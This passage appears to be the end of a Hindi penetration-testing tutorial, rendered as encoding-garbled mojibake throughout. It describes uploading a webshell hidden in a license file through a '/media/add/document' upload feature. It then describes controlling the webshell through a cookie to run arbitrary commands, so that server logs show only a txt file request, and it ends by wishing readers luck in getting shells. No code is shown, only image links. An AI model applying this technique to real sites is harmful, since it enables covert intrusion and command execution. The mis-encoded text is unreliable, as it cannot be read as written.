рдлрд┐рд░, рд╣рдо _Add Document_ (/media/add/document) рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡реЗрдмрд╢реЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рд▓рд╛рдЗрд╕реЗрдВрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рдЫрд┐рдкрд╛ рд╣реЛрддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 4 (рд╡реЗрдмрд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

рдЕрдВрддрд┐рдо рднрд╛рдЧ рдореЗрдВ рд╡реЗрдмрд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рд╣рдорд╛рд░реЗ рд╡реЗрдмрд╢реЗрд▓ рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдХреБрдХреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдореЗрдВ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреА рдкрд░рд╛рдорд░реНрд╢ рдХрд░рдиреЗ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рдгрд╛рдо рдорд┐рд▓рддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

рдЬрдм рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреБрдХреА рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рд╡реЗрдмрд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡рд╣ рдЬреЛ рднреА рдХрдорд╛рдВрдб рдЪрд╛рд╣реЗ рд╡рд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд▓реЙрдЧ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рдПрдХ txt рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд▓реЗрдЦ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж, рдореБрдЭреЗ рдЖрд╢рд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЖрдкрдХреЛ рдХреБрдЫ рд╢реИрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛ред
